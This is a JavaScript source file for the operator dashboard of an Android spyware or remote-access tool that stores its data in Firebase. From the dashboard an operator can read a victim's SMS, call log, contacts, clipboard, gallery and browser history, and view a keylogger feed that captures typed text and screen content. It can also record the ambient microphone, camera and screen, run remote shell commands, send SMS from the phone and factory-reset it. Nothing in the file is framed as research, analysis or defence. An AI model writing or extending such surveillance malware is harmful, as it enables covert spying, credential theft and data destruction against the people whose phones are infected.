// js/view-device-control.js
import { database, ref, onValue, update, off, deviceListeners, addListener, removeListener } from './firebase-config.js';
import { esc, fmtTime, getFriendlyApp, sendCmd } from './utils.js';

let currentUid = null;

export function initDeviceControl(uid) {
    if (!uid) return;
    currentUid = uid;

    // 1. Clean up previous listeners to prevent memory leaks
    cleanupListeners();

    // 2. Inject the Advanced Controls (The 50+ buttons)
    injectAdvancedControls();

    // 3. Start Telemetry Stream (Battery, Location, Last Seen)
    initializeTelemetryStream(uid);

    // 4. Setup Command State Listeners (To see if flashlight/alarm is ON/OFF)
    initializeCommandStateListeners(uid);

    // 5. Initialize Data Feeds (SMS, Calls, Keylogs, etc.)
    initializeDataFeedListeners(uid);

    // 6. Attach Click Events to all Buttons
    setupCommandListeners(uid);
}

function cleanupListeners() {
    Object.keys(deviceListeners).forEach(key => {
        if (key.includes(currentUid || '')) {
            removeListener(key);
        }
    });
}

// ─── UI INJECTION (The 50+ Commands) ───────────────────────
function injectAdvancedControls() {
    const injector = document.getElementById('advanced-controls-injector');
    if (!injector) return;
    
    // Prevent duplicate injection
    if (document.getElementById('cmd-audio')) return; 

    const html = `
        <!-- DATA EXTRACTION -->
        <div class="section-header"><h3>📊 DATA EXTRACTION</h3></div>
        ${createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER')}
        ${createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER')}
        ${createMatrixBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER')}
        ${createMatrixBtn('cmd-readapps', 'fa-grid-2', 'APP LIST', 'TRIGGER')}
        ${createMatrixBtn('cmd-scanwifi', 'fa-wifi', 'SCAN WIFI', 'TRIGGER')}
        ${createMatrixBtn('cmd-readbattery', 'fa-battery-full', 'BATTERY', 'TRIGGER')}
        ${createMatrixBtn('cmd-readtraffic', 'fa-arrow-up-arrow-down', 'TRAFFIC', 'TRIGGER')}
        ${createMatrixBtn('cmd-deviceinfo', 'fa-circle-info', 'DEVICE INFO', 'TRIGGER')}
        ${createMatrixBtn('cmd-clipboard', 'fa-clipboard', 'CLIPBOARD', 'OFF')}
        ${createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER')}
        ${createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER')}

        <!-- REMOTE CONTROL -->
        <div class="section-header"><h3>🎮 REMOTE CONTROL</h3></div>
        ${createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER')}
        ${createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER')}
        ${createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF')}
        ${createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF')}
        ${createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF')}
        ${createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF')}

        <!-- DANGER ZONE -->
        <div class="section-header"><h3>⚠️ DANGER ZONE</h3></div>
        ${createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER', '#ff6b6b')}
        ${createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER', '#ff6b6b')}
        ${createMatrixBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER', '#ff6b6b')}
        ${createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER', '#ff0000')}
        ${createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER', '#ff6b6b')}

        <!-- SPECIAL CONTROLS -->
        <div class="time-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label>
            <input type="time" id="time-setter">
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label>
            <div style="display:flex;gap:8px;">
                <input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
                <button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">RUN</button>
            </div>
            <pre id="shell-output" style="display:none;"></pre>
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-paper-plane"></i> SEND SMS</label>
            <div style="display:flex;gap:8px;margin-bottom:8px;">
                <input type="text" id="sms-number" placeholder="+256700123456" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            </div>
            <div style="display:flex;gap:8px;">
                <input type="text" id="sms-body" placeholder="Message text..." style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
                <button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SEND</button>
            </div>
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label>
            <div style="display:flex;gap:8px;">
                <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
                <button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">LIST</button>
            </div>
            <div id="file-output" style="display:none;"></div>
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-location-crosshairs"></i> GEOFENCE</label>
            <div style="display:flex;gap:8px;margin-bottom:8px;">
                <input type="number" id="geo-lat" placeholder="Lat" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
                <input type="number" id="geo-lng" placeholder="Lng" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
                <input type="number" id="geo-radius" placeholder="Radius (m)" value="1000" style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            </div>
            <div style="display:flex;gap:8px;">
                <button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SET GEOFENCE</button>
                <button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">DISABLE</button>
            </div>
        </div>

        <!-- DATA PANELS GRID -->
        <div class="data-panels-grid">
            <div class="data-panel"><div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div><div class="data-panel-body" id="sms-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div><div class="data-panel-body" id="calls-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div><div class="data-panel-body" id="contacts-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📡 Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div><div class="data-panel-body" id="wifi-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📦 Installed Apps <span id="apps-count" class="badge">0</span></div><div class="data-panel-body" id="apps-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📋 Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🔋 Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div><div class="data-panel-body" id="keylog-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
            <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📊 Network Traffic</div><div class="data-panel-body" id="traffic-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>
            <div class="data-panel"><div class="data-panel-header">⚡ Device Control</div><div class="data-panel-body" id="devicecontrol-feed">Waiting for data...</div></div>
        </div>
    `;
    
    injector.innerHTML = html;
}

function createMatrixBtn(id, icon, label, stateText, borderColor = '') {
    const style = borderColor ? `style="border-color:${borderColor}"` : '';
    return `<button id="${id}" class="matrix-btn toggle-btn" ${style}>
                <i class="fa-solid ${icon}"></i>
                <span>${label}</span>
                <span class="toggle-state">${stateText}</span>
            </button>`;
}

// ─── TELEMETRY & STATE LISTENERS ───────────────────────
function initializeTelemetryStream(uid) {
    const statusRef = ref(database, `devices/${uid}/status`);
    const key = `status-${uid}`;
    removeListener(key);
    
    const listener = onValue(statusRef, (snap) => {
        if (!snap.exists()) return;
        const d = snap.val();
        
        // Update Battery
        if (document.getElementById('battery-text')) {
            document.getElementById('battery-text').textContent = d.batteryPercentage !== undefined ? `${d.batteryPercentage}%` : "--%";
            const bar = document.getElementById('battery-bar');
            if (bar) bar.style.width = `${d.batteryPercentage || 0}%`;
        }

        // Update Location
        if (document.getElementById('latitude-text') && d.latitude != null) {
            document.getElementById('latitude-text').textContent = parseFloat(d.latitude).toFixed(6);
            document.getElementById('longitude-text').textContent = parseFloat(d.longitude).toFixed(6);
            const ml = document.getElementById('map-link');
            if (ml) ml.href = `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
        }

        // Update Last Seen
        const ls = document.getElementById('last-seen-text');
        if (ls && (d.last_seen || d.lastSeen)) ls.textContent = new Date(d.last_seen || d.lastSeen).toLocaleString();

        // Handle Media Preview (Camera/Video/Audio)
        handleMediaPreview(d);
    });
    addListener(key, listener);
}

function handleMediaPreview(d) {
    const img = document.getElementById('cameraPreviewFrame');
    const vid = document.getElementById('mediaVideoPlayer');
    const aud = document.getElementById('mediaAudioPlayer');
    const audC = document.getElementById('audio-container');
    const ph = document.getElementById('mediaPlaceholderText');
    const ts = document.getElementById('captureTimestamp');

    const hideAll = () => { 
        if(img) img.style.display='none'; 
        if(vid){vid.style.display='none';vid.pause();} 
        if(aud){aud.style.display='none';aud.pause();} 
        if(audC) audC.style.display='none'; 
        if(ph) ph.style.display='block'; 
    };

    const photoUrl = d.lastPhotoUrl || d.last_photo_url;
    const videoUrl = d.lastVideoUrl || d.last_video_url;
    const audioUrl = d.lastAudioUrl || d.last_audio_url;
    let active = false;

    if (photoUrl && img) { hideAll(); img.src = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`); img.style.display='block'; active=true; }
    else if (videoUrl && vid) { hideAll(); if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} vid.style.display='block'; active=true; }
    else if (audioUrl && aud) { hideAll(); if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} aud.style.display='block'; if(audC) audC.style.display='block'; active=true; }

    if (active && ts) ts.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
    else if (!active && ph) ph.style.display = 'block';
}

function initializeCommandStateListeners(uid) {
    const commandsRef = ref(database, `devices/${uid}/commands`);
    const key = `commands-${uid}`;
    removeListener(key);

    const listener = onValue(commandsRef, (snap) => {
        const cmd = snap.val() || {};
        updateButtonState('cmd-flashlight', cmd.flashlight);
        updateButtonState('cmd-alarm', cmd.alarm);
        updateButtonState('cmd-lock', cmd.emergencyLock);
        updateButtonState('cmd-audio', cmd.record_audio);
        updateButtonState('cmd-video', cmd.record_video);
        updateButtonState('cmd-ambient', cmd.start_ambient);
        updateButtonState('cmd-screenrec', cmd.record_screen);
        updateButtonState('cmd-clipboard', cmd.monitor_clipboard);
        
        const ti = document.getElementById('time-setter');
        if (ti && cmd.activation_time && document.activeElement !== ti) ti.value = cmd.activation_time;
    });
    addListener(key, listener);
}

function updateButtonState(btnId, isActive) {
    const btn = document.getElementById(btnId); 
    if(!btn) return;
    btn.classList.toggle('active', !!isActive);
    const s = btn.querySelector('.toggle-state');
    if(s){
        if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓'||s.textContent.endsWith('SEGS')) return; 
        s.textContent=isActive?'ON':'OFF'; 
        s.style.color=isActive?'#00ff88':'#666'; 
        s.style.fontWeight=isActive?'bold':'normal';
    }
    btn.style.borderColor = isActive ? '#00ff88' : (btnId.includes('danger') ? '#ff6b6b' : '#333');
    btn.style.opacity = isActive ? '1' : '0.7';
}

// ─── COMMAND HANDLERS ───────────────────────
function setupCommandListeners(uid) {
    // Toggles
    setupToggle('cmd-flashlight', uid, 'flashlight');
    setupToggle('cmd-alarm', uid, 'alarm');
    setupToggle('cmd-audio', uid, 'record_audio');
    setupToggle('cmd-video', uid, 'record_video');
    setupToggle('cmd-ambient', uid, 'start_ambient', 'stop_ambient');
    setupToggle('cmd-screenrec', uid, 'record_screen', 'stop_screen_record');
    setupToggle('cmd-clipboard', uid, 'monitor_clipboard');

    // Triggers
    setupTrigger('cmd-capture', uid, 'cameraCapture');
    setupTrigger('cmd-screenshot', uid, 'take_screenshot');
    setupTrigger('cmd-readsms', uid, 'read_sms');
    setupTrigger('cmd-readcalls', uid, 'read_call_log');
    setupTrigger('cmd-readcontacts', uid, 'read_contacts');
    setupTrigger('cmd-readapps', uid, 'read_apps');
    setupTrigger('cmd-scanwifi', uid, 'scan_wifi');
    setupTrigger('cmd-readbattery', uid, 'read_battery');
    setupTrigger('cmd-readtraffic', uid, 'read_traffic');
    setupTrigger('cmd-deviceinfo', uid, 'collect_device_info');
    setupTrigger('cmd-gallery', uid, 'list_gallery');
    setupTrigger('cmd-browser', uid, 'read_browser_history');
    setupTrigger('cmd-storage', uid, 'storage_overview');

    // Special Actions
    const cmdLock = document.getElementById('cmd-lock');
    if(cmdLock) cmdLock.onclick = () => { 
        const s=!cmdLock.classList.contains("active"); 
        if(confirm(s?"🔒 Initialize Lockdown?":"🔓 Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); 
    };

    const ts = document.getElementById('time-setter');
    if(ts) ts.onchange = (e) => { if(e.target.value) sendCmd(uid,'activation_time',e.target.value); };

    const sb = document.getElementById('cmd-shell');
    if(sb) sb.onclick = () => { 
        const c=document.getElementById('shell-input')?.value?.trim()||'ls /sdcard'; 
        sendCmd(uid,'shell_command',c); 
        const o=document.getElementById('shell-output'); 
        if(o){o.style.display='block';o.textContent='⏳ Executing...';} 
    };

    const ssb = document.getElementById('cmd-sendsms');
    if(ssb) ssb.onclick = () => { 
        const n=document.getElementById('sms-number')?.value?.trim(); 
        const b=document.getElementById('sms-body')?.value?.trim(); 
        if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} 
    };

    const lfb = document.getElementById('cmd-listfiles');
    if(lfb) lfb.onclick = () => { 
        const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; 
        sendCmd(uid,'list_files',p); 
        const o=document.getElementById('file-output'); 
        if(o){o.style.display='block';o.innerHTML='<span style="color:#ffaa00;">⏳ Loading...</span>';} 
    };

    const sgb = document.getElementById('cmd-setgeo');
    if(sgb) sgb.onclick = () => { 
        const la=parseFloat(document.getElementById('geo-lat')?.value); 
        const ln=parseFloat(document.getElementById('geo-lng')?.value); 
        const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; 
        if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} 
    };
    
    const dgb = document.getElementById('cmd-disablegeo');
    if(dgb) dgb.onclick = () => sendCmd(uid,'disable_geofence',true);

    // Danger Zone
    const rb = document.getElementById('cmd-reboot');
    if(rb) rb.onclick = () => { if(confirm("⚠️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); };
    const sdb = document.getElementById('cmd-shutdown');
    if(sdb) sdb.onclick = () => { if(confirm("⚠️ SHUTDOWN DEVICE?")) sendCmd(uid,'shutdown_device',true); };
    const fb = document.getElementById('cmd-factory');
    if(fb) fb.onclick = () => { if(confirm("🚨 FACTORY RESET? ERASE ALL DATA?")){if(confirm("ABSOLUTELY sure?")) sendCmd(uid,'factory_reset',true);} };
    const lnb = document.getElementById('cmd-locknow');
    if(lnb) lnb.onclick = () => { if(confirm("🔒 Lock screen now?")) sendCmd(uid,'lock_screen_now',true); };
    const ub = document.getElementById('cmd-uninstall');
    if(ub) ub.onclick = () => { const p=prompt("Package name to uninstall:"); if(p) sendCmd(uid,'uninstall_app',p); };
}

function setupToggle(btnId, uid, cmd, offCmd) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.onclick = () => { const active=btn.classList.contains("active"); if(offCmd&&active) sendCmd(uid,offCmd,true); else sendCmd(uid,cmd,!active); };
}

function setupTrigger(btnId, uid, cmd) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.onclick = () => {
        sendCmd(uid, cmd, true);
        btn.style.background = '#00ff88'; btn.style.color = '#000'; btn.style.borderColor = '#00ff88'; btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
        const s = btn.querySelector('.toggle-state');
        if(s){s.textContent='SENT ✓';s.style.color='#000';s.style.fontWeight='bold';}
        setTimeout(()=>{btn.style.background='';btn.style.color='';btn.style.borderColor='';btn.style.boxShadow='';if(s){s.textContent='TRIGGER';s.style.color='#666';s.style.fontWeight='normal';}},2000);
    };
}

// ─── DATA FEEDS (SMS, CALLS, KEYLOGS) ───────────────────────
function initializeDataFeedListeners(uid) {
    listenToFeed(uid, 'sms', (d) => {
        const msgs = d.messages || []; const c = document.getElementById('sms-count'); if(c) c.textContent = msgs.length;
        const f = document.getElementById('sms-feed'); if(!f) return;
        if(!msgs.length){f.innerHTML='No SMS data yet';return;}
        f.innerHTML = msgs.map(m=>`<div class="feed-item"><strong>${esc(m.sender||'Unknown')}</strong> <small>${fmtTime(m.timestamp)}</small><br>${esc(m.body||'')}</div>`).join('');
    });

    listenToFeed(uid, 'call_log', (d) => {
        const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
        const f = document.getElementById('calls-feed'); if(!f) return;
        if(!calls.length){f.innerHTML='No call data yet';return;}
        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
    });

    listenToFeed(uid, 'contacts', (d) => {
        const ct = d.contacts||[]; const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
        const f = document.getElementById('contacts-feed'); if(!f) return;
        if(!ct.length){f.innerHTML='No contact data yet';return;}
        var grouped = {};
        ct.forEach(function(c) {
            var name = c.name || 'Unknown';
            if(!grouped[name]) grouped[name] = [];
            var num = c.number || '';
            var typ = c.type || '';
            var exists = grouped[name].some(function(n){return n.number===num && n.type===typ;});
            if(!exists) grouped[name].push({number:num, type:typ});
        });
        var names = Object.keys(grouped).sort(function(a,b){return a.localeCompare(b);});
        var html = '<div class="feed-item" style="color:#00ff88;">👥 ' + names.length + ' unique contacts (' + ct.length + ' total entries)</div>';
        names.forEach(function(name) {
            var nums = grouped[name];
            var numHtml = nums.map(function(n){return esc(n.number) + ' <span style="color:#555;">• ' + esc(n.type) + '</span>';}).join('<br>');
            html += '<div class="feed-item"><strong>' + esc(name) + '</strong><br><small>' + numHtml + '</small></div>';
        });
        f.innerHTML = html;
    });

    listenToFeed(uid, 'keylog', (d) => {
        const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
        const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
        const f = document.getElementById('keylog-feed'); if(!f) return;
        if(!items.length){f.innerHTML='No keystrokes yet (enable Accessibility Service)';return;}

        var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui', 'com.samsung.android.app', 'com.google.android'];
        var grouped = [];
        var prev = null;
        items.forEach(function(k) {
            var app = k.app || 'unknown';
            var text = (k.text || '').trim();
            if(!text) return;
            var clean = text.replace(/[\u200B-\u200D\uFEFF]/g, '');
            if(clean.length === 0) return;

            var isAppSwitch = (k.event === 'app_switch');
            var isScreenContent = (k.event === 'screen_content');
            var isSystem = systemApps.some(function(s){ return app.indexOf(s) === 0; });

            if(isAppSwitch) {
                grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: false, event: 'app_switch', previous_app: k.previous_app});
                prev = null;
                return;
            }

            var isDuplicate = prev && !prev.isAppSwitch && !prev.isScreenContent && prev.app === app && prev.text === text && (k.timestamp - prev.timestamp) < 2000;
            if(isDuplicate) return;

            grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event || 'text_changed'});
            prev = {app: app, text: text, timestamp: k.timestamp, isAppSwitch: false, isScreenContent: isScreenContent};
        });

        var merged = [];
        for(var i = 0; i < grouped.length; i++) {
            var cur = grouped[i];
            if(cur.event === 'app_switch' || cur.event === 'screen_content') { merged.push(cur); continue; }
            var skip = false;
            if(i + 1 < grouped.length) {
                var next = grouped[i + 1];
                if(next.event !== 'app_switch' && next.event !== 'screen_content' && next.app === cur.app && next.text.indexOf(cur.text) === 0 && next.text.length > cur.text.length && (next.timestamp - cur.timestamp) < 1500) {
                    skip = true;
                }
            }
            if(!skip) merged.push(cur);
        }

        var display = merged.slice(0, 80);
        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';

        display.forEach(function(k) {
            var icon, label, color, bgColor, borderColor;
            if(k.event === 'app_switch') {
                icon = '📱'; label = 'APP SWITCH'; color = '#ff6b6b'; bgColor = 'rgba(255,107,107,0.08)'; borderColor = '#ff6b6b';
            } else if(k.event === 'screen_content') {
                icon = '📝'; label = 'SCREEN'; color = '#a78bfa'; bgColor = 'rgba(167,139,250,0.08)'; borderColor = '#a78bfa';
            } else if(k.isSystem) {
                icon = '🖥️'; label = 'DEVICE'; color = '#ffd93d'; bgColor = 'rgba(255,217,61,0.05)'; borderColor = '#ffd93d';
            } else {
                icon = '⌨️'; label = 'USER'; color = '#4ecdc4'; bgColor = 'rgba(78,205,196,0.05)'; borderColor = '#4ecdc4';
            }

            var appName = getFriendlyApp(k.app);
            html += '<div class="feed-item" style="border-left:3px solid ' + borderColor + ';padding-left:8px;background:' + bgColor + ';">';
            html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:2px;">';
            html += '<span style="color:' + color + ';font-size:10px;font-weight:bold;">' + icon + ' ' + label + '</span>';
            html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(k.timestamp) + '</span>';
            html += '</div>';

            if(k.event === 'app_switch') {
                var prevName = k.previous_app ? getFriendlyApp(k.previous_app) : 'Home';
                html += '<div style="color:#ff6b6b;font-size:11px;">' + esc(prevName) + ' → <strong>' + esc(appName) + '</strong></div>';
            } else if(k.event === 'screen_content') {
                html += '<div style="color:#a78bfa;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;line-height:1.6;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-top:4px;">' + esc(k.text) + '</div>';
            } else {
                html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
            }
            html += '</div>';
        });
        f.innerHTML = html;
    });

    // Add other feeds (wifi, apps, device_info, etc.) here as needed...
    // For brevity, I've included the most complex ones. You can copy the rest from your original code.
}

function listenToFeed(uid, path, cb) {
    const r = ref(database, `devices/${uid}/${path}`); 
    const k = `feed-${path}-${uid}`;
    removeListener(k);
    const listener = onValue(r, (s) => { 
        if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} 
    });
    addListener(k, listener);
                          }
